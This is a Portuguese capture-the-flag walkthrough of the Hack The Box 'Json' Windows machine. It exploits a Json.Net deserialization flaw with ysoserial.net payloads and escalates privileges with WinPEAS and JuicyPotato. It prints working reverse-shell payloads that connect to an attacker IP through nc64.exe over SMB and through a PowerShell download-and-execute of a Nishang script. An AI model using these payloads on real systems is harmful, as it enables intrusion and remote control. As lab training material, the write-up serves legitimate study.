---
title: "Hack The Box - Json"
tags: [Windows,Medium,BurpSuite,BurpSuite Repeater,JavaScript,JS Deobfuscation,Deserealization,.NET,Ysoserial,ObjectDataProvider,WindowsIdentity,Impacket-smbserevr,Nishang,WinPEAS,PowerUp,JuicyPotato,SeImpersonatePrivilege,Sync2FTP,DNSPY,Decompilação,Binário,UTF-16 LE,Chisel,Port Forwading,FileZilla]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/210>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos uma pancada de portas abertas

> Porta 21 - Servidor FTP

> Porta 80 - Servidor Web

> Portas 135, 139 e 445 - Servidor Samba

O resto não nos interessa muito para fins de exploração

## Enumeração da Porta 21

Vamos iniciar enumerando a porta 21, o servidor FTP que tem nessa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_ftp.png)

Não conseguimos acesso anonimo, então vamos procurar por exploits, uma vez que a versão da aplicação nós temos FileZilla Server 0.9.60

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_ftp1.png)

Pelo visto não iremos ter muito sucesso indo por esse caminho, então vamos continuar na enumeração de outros serviços

## Enumeração da Porta 445

Então vamos para o servidor samba, na porta 445. De cara já tomamos um acesso negado, então também por hora aqui acabou

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_smb.png)

Vamos dar prosseguimento

## Enumeração da Porta 80

Primeiro passo é abrir a página do browser pra ver do que se trata, é apenas a página padrão do ISS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_web.png)

Hummm... estranho que antes de ir pra essa página redirecionado para index.html ele passou por um painel de admin... se assim que abrir pressionarmos ESC pra não carregar a próxima nós conseguimos ver, como está na imagem abaixo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_web1.png)

Tem algo ai... sempre que desconfiamos de algo assim o ideal é jogarmos a requisição pro BurpSuite e ver melhor o que está acontecendo

Verificamos que a primeira requisição é para o `/`, onde está a "página do admin" e depois disso ele carrega vários `.js`, nos direcionando para a página de login

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_burp.png)

Está estranho isso, vamos analisar como está funcionando a questão da autenticação, então tentamos logar com `admin:admin` que é uma credencial padrão e jogamos a requisição pro Burp

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_burp1.png)

Ai está a requisição de login ele faz um `POST /api/token` com o login e senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_burp2.png)

Ao enviarmos para o `Repeater` e enviarmos a requisição verificamos que ele criou o token `OAuth2` que claramente é um base64

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_burp3.png)

Decodificando ele vemos o que ele quer dizer

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_burp4.png)

### JavaScript - Deobfuscação

Hum... beleza, vamos olhar mais a fundo nas requisições que foram interceptadas, verificamos uma response que nos chamou atenção... a do `/js/app.min.js` que está claramente obfuscada...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_burp5.png)

Então vamos deobfuscar ela, pra ver se conseguimos alguma informação útil, utilizamos um serviço online para isso, o site (https://beautifier.io/)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_burp6.png)

```
angular['module']('json', ['ngCookies'])['controller']('loginController', ['$http', '$scope', '$cookies', function(_0x30f6x1, _0x30f6x2, _0x30f6x3) {
    _0x30f6x2['credentials'] = {
        UserName: '',
        Password: ''
    };
    _0x30f6x2['error'] = {
        message: '',
        show: false
    };
    var _0x30f6x4 = _0x30f6x3['get']('OAuth2');
    if (_0x30f6x4) {
        window['location']['href'] = 'index.html'
    };
    _0x30f6x2['login'] = function() {
        _0x30f6x1['post']('/api/token', _0x30f6x2['credentials'])['then'](function(_0x30f6x5) {
            window['location']['href'] = 'index.html'
        }, function(_0x30f6x6) {
            _0x30f6x2['error']['message'] = 'Invalid Credentials.';
            _0x30f6x2['error']['show'] = true;
            console['log'](_0x30f6x6)
        })
    }
}])['controller']('principalController', ['$http', '$scope', '$cookies', function(_0x30f6x1, _0x30f6x2, _0x30f6x3) {
    var _0x30f6x4 = _0x30f6x3['get']('OAuth2');
    if (_0x30f6x4) {
        _0x30f6x1['get']('/api/Account/', {
            headers: {
                "\x42\x65\x61\x72\x65\x72": _0x30f6x4
            }
        })['then'](function(_0x30f6x5) {
            _0x30f6x2['UserName'] = _0x30f6x5['data']['Name']
        }, function(_0x30f6x6) {
            _0x30f6x3['remove']('OAuth2');
            window['location']['href'] = 'login.html'
        })
    } else {
        window['location']['href'] = 'login.html'
    }
}])
```

Analisando de primeira não é muito claro o que está acontecendo, pelo que da pra endenter ele faz um POST para /api/Token, consegue o cookie (OAuth2) e depois pelo que parece ele faz um GET para /api/Account com esse cookie setado... vamos tentar ver como funciona isso?

Aqui está a requisição

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_burp7.png)

Mandamos ela pro `Repeater` pra ver como é a response dela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_burp9.png)

### Descobrindo vulnerabilidade Deserealization

Ele aceitou... e deu OK. Verificamos que ele envia o Cookie através do `Bearer`... mas o que é isso?

```
Bearer authentication (também conhecido como token authentication) é um Schema para autenticação HTTP (RC6750). O Bearer identifica recursos protegidos por um OAuth2. O <token> deve ser um string. Ele representa uma autorização do Server emitida para o client.
```

Humm... deixa eu ver se entendi, é como se fosse uma "proteção" do OAuth2, é quem diz para o servidor que é "válido", enviando ele corretamente, a autenticação da certo, mas se enviarmos um base64 com qualquer coisa, vamos ver como ele se comporta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_burp8.png)

Algo nos chamou atenção, `Cannot deserialize Json.Net Object`. Interessante!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_burp10.png)

# Exploração .NET Serialization

Sempre que vejo que o servidor está deserealizando algum input do client me acende um alerta. Pq possivelmente é possível explorar por ali. Há diversas vulnerabilidades/falhas quando falamos de serialização

Mas o que é serilização? Uma explicação simples e direta, (http://www.macoratti.net/vbn_seri.htm)

```
Já ouviu falar em serialização ? O que é serializar ? Como podemos fazer isto na plataforma .NET ?

De forma genérica a serialização é uma técnica usada para persistir objetos , ou seja :  gravar objetos em disco , fazer a transmissão remota de objetos via rede , armazenar os objetos em um banco de dados e/ou arquivos (binários , xml, etc.)

Serializar nada mais é do que colocar os valores que o objeto está utilizando juntamente com suas propriedades de uma forma que fique em série (sequencial) . Fazendo isto estamos tornando o objeto Serializable, e, tornando um objeto Serializable, estamos atribuindo essa qualidade a ele, e dando privilégios para que o mesmo possa ser gravado em disco ou enviado por rede.

A serialização é o processo de armazenar um objeto , incluindo todos os atributos públicos e privados para um stream.

Se você faz a serialização naturalmente vai querer fazer o processo inverso - deserialização , que seria restaurar os atributos de um objeto gravado em um stream. (Este stream pode ser um arquivo binário , xml , etc.)

Nota: Tradução de stream - fluxo (no caso de dados) . Melhor deixar stream mesmo.

Por que você iria querer usar a serialização ? 

Primeiro por que nem tudo se pode armazenar em um banco de dados . As vezes a natureza da sua aplicação não exige um banco de dados ou usar um banco de dados pode ficar muito caro para o tamanho dos dados que se quer guardar ou ainda você pode também querer gravar os dados em disco para posterior recuperação. Enfim , se você não quer usar um banco de dados , e quer persistir seus objetos pode fazer isto de diversas maneiras mas o trabalho exigirá mais código , mais trabalho e mais tempo.

Serializar não é tão simples como parece pois para armazenar uma estrutura de memória que se utilize de referências é preciso armazenar todos os tipos de dados primitivos isoladamente com alguma chave de acesso . Sem contar que não é possível armazenar diretamente referências a objetos porque as mesmas são baseadas em endereços de memória e a própria ordem em que se carrega os objetos pode implicar em que eles sejam alocados em posições de memória diferentes daquelas que ocupavam quando foram gravados.

A plataforma .NET oferece recursos que tornam as tarefas de Serializar e deserializar , tarefas muito simples de serem realizadas. Neste artigo vou mostrar como podemos serializar e deserializar objetos no VB .NET.
```

Certo, compreendi o que é serialização e tudo mais, mas como posso explorar isso? A exploração ocorre quando a aplicação vai "converter" esse token de novo, serializando/executando ele, conseguimos injetar código malicioso, e uma das funções existentes na API da serialização vai executar esse código.... Se ficou confuso (deve ter ficado pra caralho) vamos tentar explicar melhor demonstrando

## Compilando ysoserial.exe

Para explicar da melhor maneira possível vamos passar para uma máquina Windows, e compilar por lá. Uma vez que a máquina que vamos atacar é Windows.

Iremos utilizar uma ferramenta chamada YSoSerial (Também utilizada na máquina Arkham, que irei fazer o writeup mais a frente)

O link do GitHub onde a ferramenta está disponível é esse: https://github.com/pwntester/ysoserial.net

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y.png)

Baixamos ela na nossa Windows o ideal é sempre utilizar de VMs, aqui neste caso eu utilizei a VM Comando (https://github.com/fireeye/commando-vm), excepcional para pentest, pq ela já vem bem completa com ferramentas ofensivas

Então baixamos ela a máquina

> git clone https://github.com/pwntester/ysoserial.net.git

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y1.png)

Abrimos com o Microsoft Visual Studio 2019 o arquivo *.sln, para podermos compilar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y2.png)

Pô, mas já tem o release dela no github, sim tem, mas aqui a ideia é demonstrar como podemos fazer a compilação. Então compilamos o código, Mudamos para `Release`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y3.png)

Agora vamos em Build - Rebuild Solution

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y4.png)

Agora verificamos a saída no Output

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y5.png)

Agora vemos na pasta onde foi compilado o código, o executável

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y6.png)

Executamos ele no Powershell pra ver como utilizar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y7.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y8.png)

Agora eu posso utilizar diversos gadgets (-g) que vão dar certo, na demonstração aqui irei utilizar duas a `WindowsIdentity` e a `ObjectDataProvider` e já vou jogar as saídas para base64 pra ficar melhor de jogar no BurpSuite

ObjectDataProvider
```
PS C:\Users\User\Desktop\github\ysoserial.net\ysoserial\bin\Release > .\ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 1 10.10.16.117" -o base64
ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIHBpbmcgLW4gMSAxMC4xMC4xNi4xMTcnXQ0KICAgIH0sDQogICAgJ09iamVjdEluc3RhbmNlJzp7JyR0eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknfQ0KfQ==
```

WindowsIdentity
```
PS C:\Users\User\Desktop\github\ysoserial.net\ysoserial\bin\Release > .\ysoserial.exe -g WindowsIdentity -f Json.Net -c "ping -n 1 10.10.16.117" -o base64
ew0KICAgICAgICAgICAgICAgICAgICAnJHR5cGUnOiAnU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OScsDQogICAgICAgICAgICAgICAgICAgICdTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zSWRlbnRpdHkuYWN0b3InOiAnQUFFQUFBRC8vLy8vQVFBQUFBQUFBQUFNQWdBQUFGNU5hV055YjNOdlpuUXVVRzkzWlhKVGFHVnNiQzVGWkdsMGIzSXNJRlpsY25OcGIyNDlNeTR3TGpBdU1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmowek1XSm1NemcxTm1Ga016WTBaVE0xQlFFQUFBQkNUV2xqY205emIyWjBMbFpwYzNWaGJGTjBkV1JwYnk1VVpYaDBMa1p2Y20xaGRIUnBibWN1VkdWNGRFWnZjbTFoZEhScGJtZFNkVzVRY205d1pYSjBhV1Z6QVFBQUFBOUdiM0psWjNKdmRXNWtRbkoxYzJnQkFnQUFBQVlEQUFBQXhBVThQM2h0YkNCMlpYSnphVzl1UFNJeExqQWlJR1Z1WTI5a2FXNW5QU0oxZEdZdE9DSS9QZzBLUEU5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2lCTlpYUm9iMlJPWVcxbFBTSlRkR0Z5ZENJZ1NYTkpibWwwYVdGc1RHOWhaRVZ1WVdKc1pXUTlJa1poYkhObElpQjRiV3h1Y3owaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3dmNISmxjMlZ1ZEdGMGFXOXVJaUI0Yld4dWN6cHpaRDBpWTJ4eUxXNWhiV1Z6Y0dGalpUcFRlWE4wWlcwdVJHbGhaMjV2YzNScFkzTTdZWE56WlcxaWJIazlVM2x6ZEdWdElpQjRiV3h1Y3pwNFBTSm9kSFJ3T2k4dmMyTm9aVzFoY3k1dGFXTnliM052Wm5RdVkyOXRMM2RwYm1aNEx6SXdNRFl2ZUdGdGJDSStEUW9nSUR4UFltcGxZM1JFWVhSaFVISnZkbWxrWlhJdVQySnFaV04wU1c1emRHRnVZMlUrRFFvZ0lDQWdQSE5rT2xCeWIyTmxjM00rRFFvZ0lDQWdJQ0E4YzJRNlVISnZZMlZ6Y3k1VGRHRnlkRWx1Wm04K0RRb2dJQ0FnSUNBZ0lEeHpaRHBRY205alpYTnpVM1JoY25SSmJtWnZJRUZ5WjNWdFpXNTBjejBpTDJNZ2NHbHVaeUF0YmlBeElERXdMakV3TGpFMkxqRXhOeUlnVTNSaGJtUmhjbVJGY25KdmNrVnVZMjlrYVc1blBTSjdlRHBPZFd4c2ZTSWdVM1JoYm1SaGNtUlBkWFJ3ZFhSRmJtTnZaR2x1WnowaWUzZzZUblZzYkgwaUlGVnpaWEpPWVcxbFBTSWlJRkJoYzNOM2IzSmtQU0o3ZURwT2RXeHNmU0lnUkc5dFlXbHVQU0lpSUV4dllXUlZjMlZ5VUhKdlptbHNaVDBpUm1Gc2MyVWlJRVpwYkdWT1lXMWxQU0pqYldRaUlDOCtEUW9nSUNBZ0lDQThMM05rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJRHd2YzJRNlVISnZZMlZ6Y3o0TkNpQWdQQzlQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VDJKcVpXTjBTVzV6ZEdGdVkyVStEUW84TDA5aWFtVmpkRVJoZEdGUWNtOTJhV1JsY2o0TCcNCiAgICAgICAgICAgICAgICB9
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y9.png)

Podemos verificar o raw deles, o que realmente é enviado ao servidor com a opção -o raw ao invés de -o base64

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y12.png)

Agora copiamos ambos e jogar dentro do BurpSuite

ObjectDataProvider

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y10.png)

WindowsIdentity

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y11.png)

Também daria com outros Gadgets, o que eu sempre utilizo é esse `ObjectDataProvider`, o pq eu não sei, mas ele quase sempre da certo, então geramos um payload nele para nos dar um reverse shell. Vamos fazer de dois modos, através do compartilhamento samba da minha Kali com un nc64.exe e através do Nishang

## Pegando Shell (1º Modo - Samba)

Esse é o modo mais simples

```
PS C:\Users\User\Desktop\github\ysoserial.net\ysoserial\bin\Release > .\ysoserial.exe -g ObjectDataProvider -f Json.Net -c "net use \\10.10.16.117\json /u:qualquer qualquer & \\10.10.16.117\json\nc64.exe -e cmd.exe 10.10.16.117 443" -o base64
ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywgJy9jIG5ldCB1c2UgXFxcXDEwLjEwLjE2LjExN1xcanNvbiAvdTpxdWFscXVlciBxdWFscXVlciAmIFxcXFwxMC4xMC4xNi4xMTdcXGpzb25cXG5jNjQuZXhlIC1lIGNtZC5leGUgMTAuMTAuMTYuMTE3IDQ0MyddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9            
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y13.png)

Abrimos o servidor samba (impacket-smbserver.py) na Kali em uma pasta que tenha o nc64.exe

> impacket-smbserver json $(pwd)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y14.png)

Abrimos no rlwrap nc -nlvp 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y15.png)

Executamos no BurpSuite o código

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y16.png)

Recebemos a shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_y17.png)

Bom, esse foi um modo simples, mas agora vamos fazer de outro meio também pra praticar outras formas de explorar

## Pegando Shell (2º Modo - Nishang)

O problema de se conseguir um shell remoto aqui é a questão dele utilizar single quotes ('), não vai dar certo, então eu não posso simplesmente largar um IEX da vida que não vai dar certo, pq na hora de deserealizar ele vai dar erro

Tenho que converter para `UTF-16LE` antes de enviar, que é o tipo de string que o windows lê melhor

`echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/Invoke-PowerShellTcp.ps1')" | xxd | head -n5`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_n.png)

`echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | xxd | head -n5`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_n1.png)

Agora vamos converter essa saída para base64, pq se você se lembrar é o modo que o ysoserial nos da

`echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w 0; echo`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_n2.png)

Agora jogamos essa saída para dentro de um .raw do ysoserial, se você se lembrar lá em cima eu fiz isso, gerei o .raw que ficou desse modo (na foto ele já está modificado, pronto para ser enviado)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_n3.png)

Então agora da Kali mesmo eu modifico ele

Antes:

```
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c ping -n 1 10.10.16.117']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

Depois

```
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAMQA3AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApAA==']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

Feito, jogamos para um arquivo e colocamos ele para base64

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/Y_n5.png)

Agora vamos arrumar nosso Nishang ele está disponível em (https://github.com/samratashok/nishang)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/Y_n4.png)

Copiamos o `Invoke-PowerShellTcp.ps1` para nossa pasta de trabalho e adicionamos ao final do arquivo a chamada para execução de um Reverse Shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_n6.png)

Abrimos o rlwrap nc -nlvp 443 e o Python Web Server

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_n7.png)

Agora executamos o base64 no BurpSuite e rezamos pra dar certo, pq deu trabalho pra caralho tudo isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_n8.png)

E recebemos o shell!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_n9.png)

Agora vamos iniciar a escalação de Privilégio, eu particularmente gostei muito dessa máquina. Pq ela nós da a possibilidade de explorar de diversos modos, ensinando muito bem como utilizar de diversas ferramentas e diferentes modos de se escalar privilégio, então vamos lá

# Escalação de Privilégio (PowerUp - WinPeas)

Primeira coisa vamos rodar o PowerUp, pra ver a saída padrão dele e ver se conseguimos extrair algo dali

Baixamos ele para nossa máquina

> https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_up.png)

Baixamos ele para a máquina Json

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_up1.png)

Executamos no servidor e vemos que não da certo pq não temos permissões possíveis nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_up2.png)

Bom, já que o PowerUp não conseguimos rodar, vamos tentar rodar o `WinPeas`, a ideia é sempre essa, uma não deu certo, testa outra ou sai procurando pontos de escalação na mão, que pode ser muito trabalhoso.

Pra facilitar nosso trabalho de agora e no futuro, vamos fazer um compartilhamento de pasta, aqui vamos fazer um pouco mais "complexo", ali em cima eu demonstrei como fazer um sem senha, agora vamos fazer um com senha

## Smbserver com senha

Primeiro setamos o smbserver com usuário, senha e a pasta

> impacket-smbserver -username qualquer -password dificil arquivos $(pwd)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_imp.png)

Agora no PowerShell nos conectamos com ele, aqui tem que tomar alguns procedimentos, o PS não deixa passarmos senhas direto no terminal, então temos que passar ela para uma string

```
$pass = "dificil" | ConvertTo-SecureString -AsPlainText -Force
$cred = New-Object System.Management.Automation.PsCredential('qualquer',$pass)
New-PSDrive -name escalar -root \\10.10.16.117\arquivos -Credential $cred -PSProvider "filesystem"
```

Executamos essa sequencia de comandos no PowerShell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_imp2.png)

Agora uma vez conectamos, vamos para a pasta escalar:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_imp1.png)

Agora podemos jogar os arquivos ai dentro e executar eles direto da Kali

## Executando o winpeas

Agora vamos retornar e continuar a nossa exploração com o WinPEAS, vamos jogar o executável dele pra ali dentro (após baixar o repositório do GitHub)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_winpeas.png)

> .\winPEAS.exe cmd fast > winPEASfast.txt

Agora executamos ele, jogando a saída para o arquivo winPEASfast.txt. Demora um bocado pra executar... Com o `tail -f winPEASfat.txt` vamos verificando a saída dele em tempo real

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_winpeas2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_winpeas3.png)

Vamos ver o que encontramos para explorar

SeImpersonateToken Privilege - Podemos utilizar o JuicyPotato!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_winpeas4.png)

Encontramos uma senha?! Isso mesmo? superadmin, vamos ver depois o que podemos fazer com ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_winpeas5.png)

Esse programa sync2ftp instalado nos chamou atenção pq não é comum em máquinas windows, foi quem fez a máquina que instalou ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_winpeas6.png)

Porta 17147 aberta localmente, vale a pena fazer um PortForwading pra ver do que se trata, se não for nada pelo menos praticamos como fazer o PortForwading

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_winpeas7.png)

# 1º Modo - JuicyPotato

Vamos iniciar pelo modo mais fácil, que é o JuicyPotato, uma vez que a máquina tem o SeImpersonateToken habilitado

Baixamos o JuicyPotato.exe para nossa pasta de trabalho (que está compartilhada)

> https://github.com/ohpe/juicy-potato/releases

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_juicy.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_juicy1.png)

Criamos nosso arquivo pra ser executado (um .bat). Vamos utilizar o comando powershell que utilizamos para ganhar a shell de user, pra agilizar o processo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_juciy2.png)

Agora pegamos o CLSID de administrator

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_juicy2.png)

Copiamos o shell.bat, o JuicyPotato e o para a máquina, pra ficar melhor de executar uma pasta muito boa para isso é a `\windows\system32\spool\drivers\color\` pq temos permissão de escrita full nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-json/J_copy.png)

Agora executamos ele com o `rlwrap nc -nlvp 443` aberto na nossa Kali

